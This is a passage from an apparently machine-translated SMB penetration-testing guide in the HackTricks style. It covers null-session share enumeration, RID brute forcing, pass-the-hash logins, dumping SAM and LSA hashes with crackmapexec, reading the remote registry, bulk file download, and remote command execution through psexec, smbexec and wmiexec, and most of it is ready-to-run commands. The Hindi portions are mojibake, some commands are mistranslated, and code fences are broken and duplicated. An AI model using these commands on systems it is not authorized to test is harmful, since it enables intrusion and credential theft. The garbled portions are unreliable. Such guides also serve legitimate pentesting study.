3. рдЕрдирдзрд┐рдХреГрдд рд░реВрдк рд╕реЗ SMB рд╢реЗрдпрд░реНрд╕ рддрдХ рдкрд╣реБрдВрдЪреЗрдВ
4. SMB рд╢реЗрдпрд░реНрд╕ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдкрддрд╛ рдХрд░реЗрдВ
5. SMB рд╢реЗрдпрд░реНрд╕ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
6. SMB рд╢реЗрдпрд░реНрд╕ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ
7. SMB рд╢реЗрдпрд░реНрд╕ рдореЗрдВ рдлрд╝рд╛рдЗрд▓реЗрдВ рдФрд░ рдлрд╝реЛрд▓реНрдбрд░реНрд╕ рдЦреЛрдЬреЗрдВ
8. рдлрд╝рд╛рдЗрд▓реЗрдВ рдФрд░ рдлрд╝реЛрд▓реНрдбрд░реНрд╕ рдХреЛ рдЕрдкрд▓реЛрдб рдФрд░ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ
9. SMB рд╢реЗрдпрд░реНрд╕ рдХреЗ рд▓рд┐рдП рдЕрдирдзрд┐рдХреГрдд рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд┐рд░реНрдорд╛рдг рдХрд░реЗрдВ
10. SMB рд╢реЗрдпрд░реНрд╕ рдХреЗ рд▓рд┐рдП рдЕрдирдзрд┐рдХреГрдд рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд╣рдЯрд╛рдПрдВ

## SMB рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдЙрдкрдХрд░рдг
1. enum4linux
2. smbclient
3. smbmap
4. crackmapexec
5. impacket
6. metasploit
7. nmap

## SMB рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд▓рд┐рдВрдХреНрд╕
- [SMB рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП HackTricks рд╡реЗрдмрд╕рд╛рдЗрдЯ](https://book.hacktricks.xyz/pentesting/pentesting-smb)
- [SMB рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП Metasploit рд╡реЗрдмрд╕рд╛рдЗрдЯ](https://www.metasploit.com/)
- [SMB рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП Impacket рд╡реЗрдмрд╕рд╛рдЗрдЯ](https://github.com/SecureAuthCorp/impacket)
```bash
for i in $(seq 500 1100);do rpcclient -N -U "" 10.10.10.10 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```
### Metasploit - рд╕реНрдерд╛рдиреАрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХрд╛ рдЬрд╛рдВрдЪ рдХрд░реЗрдВ
```bash
use auxiliary/scanner/smb/smb_lookupsid
set rhosts hostname.local
run
```

### **Enumerating LSARPC and SAMR rpcclient**

{% content-ref url="pentesting-smb/rpcclient-enumeration.md" %}
[rpcclient-enumeration.md](pentesting-smb/rpcclient-enumeration.md)
{% endcontent-ref %}

### GUI connection from linux

#### In the terminal:

`xdg-open smb://cascade.htb/`

#### In file browser window (nautilus, thunar, etc)

`smb://friendzone.htb/general/`

## Shared Folders Enumeration

### List shared folders

It is always recommended to look if you can access to anything, if you don't have credentials try using **null** **credentials/guest user**.

```bash
```markdown
`smbclient --no-pass -L //<IP>` # рдирд▓ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛
`smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP>` # рдпрджрд┐ рдЖрдк рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рдЫреЛрдбрд╝ рджреЗрддреЗ рд╣реИрдВ, рддреЛ рдпрд╣ рдкреНрд░рд╢реНрди рдкреВрдЫрд╛ рдЬрд╛рдПрдЧрд╛ред --pw-nt-hash рдХреЗ рд╕рд╛рде, рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЧрдпрд╛ рдкрд╛рд╕рд╡рд░реНрдб NT рд╣реИрд╢ рд╣реЛрддрд╛ рд╣реИред

`smbmap -H <IP> [-P <PORT>]` # рдирд▓ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛
`smbmap -u "username" -p "password" -H <IP> [-P <PORT>]` # рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕
`smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>]` # рдкрд╛рд╕-рдж-рд╣реИрд╢
`smbmap -R -u "username" -p "password" -H <IP> [-P <PORT>]` # рд░рд┐рдХрд░реНрд╕рд┐рд╡ рд╕реВрдЪреА

`crackmapexec smb <IP> -u '' -p '' --shares` # рдирд▓ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛
`crackmapexec smb <IP> -u 'username' -p 'password' --shares` # рдЕрддрд┐рдерд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛
`crackmapexec smb <IP> -u 'username' -H '<HASH>' --shares` # рдЕрддрд┐рдерд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛
```
```

### **Connect/List a shared folder**

```bash
# smbclient рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрдиреЗрдХреНрдЯ рдХрд░реЗрдВ
smbclient --no-pass //<IP>/<Folder>
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #рдЕрдЧрд░ рдЖрдк pwd рдХреЛ рдЫреЛрдбрд╝ рджреЗрддреЗ рд╣реИрдВ, рддреЛ рдпрд╣ рдкреНрд░рд╢реНрди рдкреВрдЫрд╛ рдЬрд╛рдПрдЧрд╛ред --pw-nt-hash рдХреЗ рд╕рд╛рде, рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЧрдпрд╛ pwd NT рд╣реИрд╢ рд╣реЛрддрд╛ рд╣реИред
#--no-pass -c 'recurse;ls' рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ smbclient рдХреЗ рд╕рд╛рде рд░рд┐рдХрд░реНрд╕рд┐рд╡ рд░реВрдк рд╕реЗ рд╕реВрдЪреА рдмрдирд╛рдПрдБ

# smbmap рдХреЗ рд╕рд╛рде рд╕реВрдЪреА рдмрдирд╛рдПрдБ, рдлрд╝реЛрд▓реНрдбрд░ рдХреЗ рдмрд┐рдирд╛ рд╕рдм рдХреБрдЫ рд╕реВрдЪреА рдмрдирд╛рдПрдБ
smbmap [-u "username" -p "password"] -R [Folder] -H <IP> [-P <PORT>] # рд░рд┐рдХрд░реНрд╕рд┐рд╡ рд╕реВрдЪреА
smbmap [-u "username" -p "password"] -r [Folder] -H <IP> [-P <PORT>] # рдЧреИрд░-рд░рд┐рдХрд░реНрд╕рд┐рд╡ рд╕реВрдЪреА
smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [Folder] -H <IP> [-P <PORT>] # рдкрд╛рд╕-рдж-рд╣реИрд╢
```

### **Manually enumerate windows shares and connect to them**

It may be possible that you are restricted to display any shares of the host machine and when you try to list them it appears as if there aren't any shares to connect to. Thus it might be worth a short to try to manually connect to a share. To enumerate the shares manually you might want to look for responses like NT\_STATUS\_ACCESS\_DENIED and NT\_STATUS\_BAD\_NETWORK\_NAME, when using a valid session (e.g. null session or valid credentials). These may indicate whether the share exists and you do not have access to it or the share does not exist at all.

Common share names for windows targets are

* C$
* D$
* ADMIN$
* IPC$
* PRINT$
* FAX$
* SYSVOL
* NETLOGON

(Common share names from _**Network Security Assessment 3rd edition**_)

You can try to connect to them by using the following command

```bash
```markdown
`smbclient -U '%' -N \\\\<IP>\\<SHARE>` # рдПрдХ рд╡рд┐рдВрдбреЛрдЬ рд╢реЗрдпрд░ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд▓ рд╕рддреНрд░
`smbclient -U '<USER>' \\\\<IP>\\<SHARE>` # рдПрдХ рд╡рд┐рдВрдбреЛрдЬ рд╢реЗрдпрд░ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдгреАрдХреГрдд рд╕рддреНрд░ (рдЖрдкрд╕реЗ рдкрд╛рд╕рд╡рд░реНрдб рдкреВрдЫрд╛ рдЬрд╛рдПрдЧрд╛)
```
```

or this script (using a null session)

```bash
#/bin/bash

ip='<TARGET-IP-HERE>'
shares=('C$' 'D$' 'ADMIN$' 'IPC$' 'PRINT$' 'FAX$' 'SYSVOL' 'NETLOGON')

for share in ${shares[*]}; do
output=$(smbclient -U '%' -N \\\\$ip\\$share -c '')

if [[ -z $output ]]; then
echo "[+] $share рдХреЗ рд▓рд┐рдП рдПрдХ рд╢реВрдиреНрдп рд╕рддреНрд░ рдмрдирд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИ" # no output if command goes through, thus assuming that a session was created
else
echo $output # echo error message (e.g. NT_STATUS_ACCESS_DENIED or NT_STATUS_BAD_NETWORK_NAME)
fi
done
```

examples

```bash
```markdown
### smbclient -U '%' -N \\\\192.168.0.24\\im_clearly_not_here # NT_STATUS_BAD_NETWORK_NAME рд▓реМрдЯрд╛рддрд╛ рд╣реИ
### smbclient -U '%' -N \\\\192.168.0.24\\ADMIN$ # NT_STATUS_ACCESS_DENIED рд▓реМрдЯрд╛рддрд╛ рд╣реИ рдпрд╛ рдЖрдкрдХреЛ рдПрдХ рд╕рддреНрд░ рджреЗрддрд╛ рд╣реИ
```
```

### Mount a shared folder

```bash
```
рдорд╛рдЙрдВрдЯ -рдЯреА рд╕реАрдЖрдИрдПрдлрдПрд╕ //x.x.x.x/share /mnt/share
рдорд╛рдЙрдВрдЯ -рдЯреА рд╕реАрдЖрдИрдПрдлрдПрд╕ -рдУ "рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо=рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛,рдкрд╛рд╕рд╡рд░реНрдб=рдкрд╛рд╕рд╡рд░реНрдб" //x.x.x.x/share /mnt/share
```
```

### **Download files**

Read previous sections to learn how to connect with credentials/Pass-the-Hash.

```bash
# рдПрдХ рдлрд╝рд╛рдЗрд▓ рдЦреЛрдЬреЗрдВ рдФрд░ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ
sudo smbmap -R рдлрд╝реЛрд▓реНрдбрд░ -H <IP> -A <рдлрд╝рд╛рдЗрд▓рдирд╛рдо> -q # рдлрд╝рд╛рдЗрд▓ рдХреЛ рд░рд┐рдХрд░реНрд╕рд┐рд╡ рдореЛрдб рдореЗрдВ рдЦреЛрдЬреЗрдВ рдФрд░ рдЗрд╕реЗ /usr/share/smbmap рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ
```

```bash
#рд╕рднреА рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ
smbclient //<IP>/<share>
> mask ""
> recurse
> prompt
> mget *
#рд╕рднреА рдЪреАрдЬреЗрдВ рдореМрдЬреВрджрд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ
```

Commands:

* mask: specifies the mask which is used to filter the files within the directory (e.g. "" for all files)
* recurse: toggles recursion on (default: off)
* prompt: toggles prompting for filenames off (default: on)
* mget: copies all files matching the mask from host to client machine

(_Information from the manpage of smbclient_)

### Domain Shared Folders Search

* [**Snaffler**](https://github.com/SnaffCon/Snaffler)****

```bash
```
Snaffler.exe -s -d domain.local -o snaffler.log -v data
```

рдпрд╣рд╛рдВ рджрд┐рдП рдЧрдП рдХрдорд╛рдВрдб рдХреЗ рджреНрд╡рд╛рд░рд╛ рдПрдХ рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗрд╡рд╛ рдХреЛ рдкреЗрдВрдЯреЗрд╕реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП Snaffler.exe рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕ рдХрдорд╛рдВрдб рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЖрдк рдПрдХ рдбреЛрдореЗрди (domain.local) рдХреЗ рд╕рд╛рде рд╕рдВрдЪрд╛рд▓рд┐рдд рд╣реЛ рд░рд╣реА рд╕реЗрд╡рд╛ рдХреЛ рд╕реНрдХреИрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕рдХреЗ рдбреЗрдЯрд╛ рдХреЛ рд╡рд┐рд╕реНрддрд╛рд░ рд╕реЗ рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓ (snaffler.log) рдореЗрдВ рд░рд┐рдХреЙрд░реНрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЖрдк рд╡рд░реНрдмреЛрд╕ рдореЛрдб (verbose mode) рдореЗрдВ рдЪрд▓ рд░рд╣реА рд╕рднреА рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рднреА рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред
```

* [**CrackMapExec**](https://wiki.porchetta.industries/smb-protocol/spidering-shares) spider.
* `-M spider_plus [--share <share_name>]`
* `--pattern txt`

```bash
```
рдпрд╣рд╛рдВ рдЖрдкрдХреЛ рдПрдХ рдЙрджрд╛рд╣рд░рдг рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬрд╣рд╛рдВ рдЖрдкрдХреЛ SMB рд╕реЗрд╡рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдХрдорд╛рдВрдб рджрд┐рдЦрд╛рдИ рджреА рд╣реИред рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ, рд╣рдордиреЗ crackmapexec рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рд╣реИ рдЬреЛ SMB рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛрддрд╛ рд╣реИред рдЗрд╕ рдХрдорд╛рдВрдб рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣рдо рдирд┐рд░реНрджрд┐рд╖реНрдЯ IP рдкрддреЗ (10.10.10.10), рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо (username), рдкрд╛рд╕рд╡рд░реНрдб (pass), рдФрд░ рд╢реЗрдпрд░ рдХрд╛ рдирд╛рдо ('Department Shares') рджреЗрдХрд░ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рд╡рд┐рднрд┐рдиреНрди рд╢реЗрдпрд░реЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣рд╛рдВ spider_plus рдПрдХ рд╢реЗрдпрд░ рдХрд╛ рдЙрджрд╛рд╣рд░рдг рд╣реИ, рд▓реЗрдХрд┐рди рдЖрдк рдЕрдкрдиреА рдЖрд╡рд╢реНрдпрдХрддрд╛рдиреБрд╕рд╛рд░ рдЗрд╕реЗ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВред
```
```

Specially interesting from shares are the files called **`Registry.xml`** as they **may contain passwords** for users configured with **autologon** via Group Policy. Or **`web.config`** files as they contains credentials.

{% hint style="info" %}
The **SYSVOL share** is **readable** by all authenticated users in the domain. In there you may **find** many different batch, VBScript, and PowerShell **scripts**.\
You should **check** the **scripts** inside of it as you might **find** sensitive info such as **passwords**.
{% endhint %}

## Read Registry

You may be able to **read the registry** using some discovered credentials. Impacket **`reg.py`** allows you to try:

```bash
```
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKCU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKLM -s
```

```
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKCU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKLM -s
```
```

## Post Exploitation

The **default config of** a **Samba** server is usually located in `/etc/samba/smb.conf` and might have some **dangerous configs**:

| **Setting**                 | **Description**                                                     |
| --------------------------- | ------------------------------------------------------------------- |
| `browseable = yes`          | Allow listing available shares in the current share?                |
| `read only = no`            | Forbid the creation and modification of files?                      |
| `writable = yes`            | Allow users to create and modify files?                             |
| `guest ok = yes`            | Allow connecting to the service without using a password?           |
| `enable privileges = yes`   | Honor privileges assigned to specific SID?                          |
| `create mask = 0777`        | What permissions must be assigned to the newly created files?       |
| `directory mask = 0777`     | What permissions must be assigned to the newly created directories? |
| `logon script = script.sh`  | What script needs to be executed on the user's login?               |
| `magic script = script.sh`  | Which script should be executed when the script gets closed?        |
| `magic output = script.out` | Where the output of the magic script needs to be stored?            |

The command `smbstatus` gives information about the **server** and about **who is connected**.

## Authenticate using Kerberos

You can **authenticate** to **kerberos** using the tools **smbclient** and **rpcclient**:

```bash
```markdown
## smbclient --kerberos //ws01win10.domain.com/C$

рдпрд╣ рдХрдорд╛рдВрдб smbclient рдХреЛ рдХреЗрд░рдмреЗрд░реЛрд╕ рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╡рд┐рдВрдбреЛрдЬ рд╕рд░реНрд╡рд░ рдкрд░ рд╕рдВрдЪрд╛рд▓рд┐рдд рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ SMB рд╕реЗрд╡рд╛ рдХреЗ рд╕рд╛рде рд╕рдВрдкрд░реНрдХ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИред рдпрд╣рд╛рдВ "//ws01win10.domain.com/C$" рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╕рд░реНрд╡рд░ рдХрд╛ рдирд╛рдо рдФрд░ рд╕рд╛рдЭрд╛ рдлрд╝реЛрд▓реНрдбрд░ рдХрд╛ рдкрде рд╣реИ рдЬрд┐рд╕рдХреЗ рд╕рд╛рде рд╕рдВрдкрд░реНрдХ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛ рд╣реИред

## rpcclient -k ws01win10.domain.com

рдпрд╣ рдХрдорд╛рдВрдб rpcclient рдХреЛ рдХреЗрд░рдмреЗрд░реЛрд╕ рдЯрд┐рдХрдЯ рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╡рд┐рдВрдбреЛрдЬ рд╕рд░реНрд╡рд░ рдХреЗ рд╕рд╛рде рд╕рдВрдкрд░реНрдХ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИред рдпрд╣рд╛рдВ "ws01win10.domain.com" рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╕рд░реНрд╡рд░ рдХрд╛ рдирд╛рдо рд╣реИ рдЬрд┐рд╕рдХреЗ рд╕рд╛рде рд╕рдВрдкрд░реНрдХ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛ рд╣реИред
```

```html
<h2>smbclient --kerberos //ws01win10.domain.com/C$</h2>

<p>рдпрд╣ рдХрдорд╛рдВрдб smbclient рдХреЛ рдХреЗрд░рдмреЗрд░реЛрд╕ рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╡рд┐рдВрдбреЛрдЬ рд╕рд░реНрд╡рд░ рдкрд░ рд╕рдВрдЪрд╛рд▓рд┐рдд рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ SMB рд╕реЗрд╡рд╛ рдХреЗ рд╕рд╛рде рд╕рдВрдкрд░реНрдХ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИред рдпрд╣рд╛рдВ "//ws01win10.domain.com/C$" рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╕рд░реНрд╡рд░ рдХрд╛ рдирд╛рдо рдФрд░ рд╕рд╛рдЭрд╛ рдлрд╝реЛрд▓реНрдбрд░ рдХрд╛ рдкрде рд╣реИ рдЬрд┐рд╕рдХреЗ рд╕рд╛рде рд╕рдВрдкрд░реНрдХ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛ рд╣реИред</p>

<h2>rpcclient -k ws01win10.domain.com</h2>

<p>рдпрд╣ рдХрдорд╛рдВрдб rpcclient рдХреЛ рдХреЗрд░рдмреЗрд░реЛрд╕ рдЯрд┐рдХрдЯ рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╡рд┐рдВрдбреЛрдЬ рд╕рд░реНрд╡рд░ рдХреЗ рд╕рд╛рде рд╕рдВрдкрд░реНрдХ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИред рдпрд╣рд╛рдВ "ws01win10.domain.com" рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╕рд░реНрд╡рд░ рдХрд╛ рдирд╛рдо рд╣реИ рдЬрд┐рд╕рдХреЗ рд╕рд╛рде рд╕рдВрдкрд░реНрдХ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛ рд╣реИред</p>
```
```

## **Execute Commands**

### **crackmapexec**

crackmapexec can execute commands **abusing** any of **mmcexec, smbexec, atexec, wmiexec** being **wmiexec** the **default** method. You can indicate which option you prefer to use with the parameter `--exec-method`:

```bash
```
apt-get install crackmapexec

crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #рдкрд╛рд╡рд░рд╢реЗрд▓ рдХреЛ рдЪрд▓рд╛рдПрдВ
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #рдХрдорд╛рдВрдб рдкреНрд░рд╡рд░реНрддрди рдХреЛ рдЪрд▓рд╛рдПрдВ
crackmapexec smb 192.168.10.11 -u Administrator -H <NTHASH> -x whoami #рдкрд╛рд╕-рдж-рд╣реИрд╢ рдХреЛ рдЪрд▓рд╛рдПрдВ
# --exec-method {mmcexec,smbexec,atexec,wmiexec} рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sam #SAM рдбрдВрдк рдХрд░реЗрдВ
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --lsa #LSASS рдореЗрдореЛрд░реА рд╣реИрд╢ рдбрдВрдк рдХрд░реЗрдВ
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sessions #рд╕рддреНрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --loggedon-users #рд▓реЙрдЧ-рдСрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --disks #рдбрд┐рд╕реНрдХреЛрдВ рдХрд╛ рдЬрд╛рдВрдЪ рдХрд░реЗрдВ
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --users #рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХрд╛ рдЬрд╛рдВрдЪ рдХрд░реЗрдВ
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --groups #рд╕рдореВрд╣реЛрдВ рдХрд╛ рдЬрд╛рдВрдЪ рдХрд░реЗрдВ
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --local-groups #рд╕реНрдерд╛рдиреАрдп рд╕рдореВрд╣реЛрдВ рдХрд╛ рдЬрд╛рдВрдЪ рдХрд░реЗрдВ
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --pass-pol #рдкрд╛рд╕рд╡рд░реНрдб рдиреАрддрд┐ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --rid-brute #RID рдмреНрд░реВрдЯ рдХрд░реЗрдВ

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -H <HASH> #рдкрд╛рд╕-рдж-рд╣реИрд╢ рдХрд░реЗрдВ
```
```

### [**psexec**](../windows-hardening/ntlm/psexec-and-winexec.md)**/**[**smbexec**](../windows-hardening/ntlm/smbexec.md)

Both options will **create a new service** (using _\pipe\svcctl_ via SMB) in the victim machine and use it to **execute something** (**psexec** will **upload** an executable file to ADMIN$ share and **smbexec** will point to **cmd.exe/powershell.exe** and put in the arguments the payload --**file-less technique-**-).\
**More info** about [**psexec** ](../windows-hardening/ntlm/psexec-and-winexec.md)and [**smbexec**](../windows-hardening/ntlm/smbexec.md).\
In **kali** it is located on /usr/share/doc/python3-impacket/examples/

```bash
#рдЕрдЧрд░ рдХреЛрдИ рдкрд╛рд╕рд╡рд░реНрдб рдирд╣реАрдВ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдЙрд╕реЗ рдкреВрдЫрд╛ рдЬрд╛рдПрдЧрд╛
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #рдкрд╛рд╕-рдж-рд╣реИрд╢
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t #рдкрд╛рд╕-рдж-рд╣реИрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ
```

Using **parameter**`-k` you can authenticate against **kerberos** instead of **NTLM**

### [wmiexec](../windows-hardening/ntlm/wmicexec.md)/dcomexec

Stealthily execute a command shell without touching the disk or running a new service using DCOM via **port 135.**\
In **kali** it is located on /usr/share/doc/python3-impacket/examples/

```bash
#рдЕрдЧрд░ рдХреЛрдИ рдкрд╛рд╕рд╡рд░реНрдб рдирд╣реАрдВ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЙрд╕рдХреЗ рд▓рд┐рдП рдкреНрд░рд╢реНрди рдкреВрдЫрд╛ рдЬрд╛рдПрдЧрд╛
./wmiexec.py [[domain/]username[:password]@]<targetName or address> #рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд▓рд┐рдП рдкреНрд░рд╢реНрди рдкреВрдЫреЗрдВрдЧреЗ
./wmiexec.py -hashes LM:NT administrator@10.10.10.103 #рдкрд╛рд╕-рдж-рд╣реИрд╢
#рдЖрдк рдЗрд╕ рдХрдорд╛рдВрдб рдХреЗ рдЕрдВрдд рдореЗрдВ рдПрдХ CMD рдХрдорд╛рдВрдб рдЬреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рд╣реИ, рдРрд╕рд╛ рдХрд░рдиреЗ рдирд╣реАрдВ рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдПрдХ рдЖрдВрд╢рд┐рдХ-рд╕рдВрд╡рд╛рджрд╛рддреНрдордХ рд╢реИрд▓ рдорд╛рдВрдЧрд╛ рдЬрд╛рдПрдЧрд╛
```

Using **parameter**`-k` you can authenticate against **kerberos** instead of **NTLM**

```bash
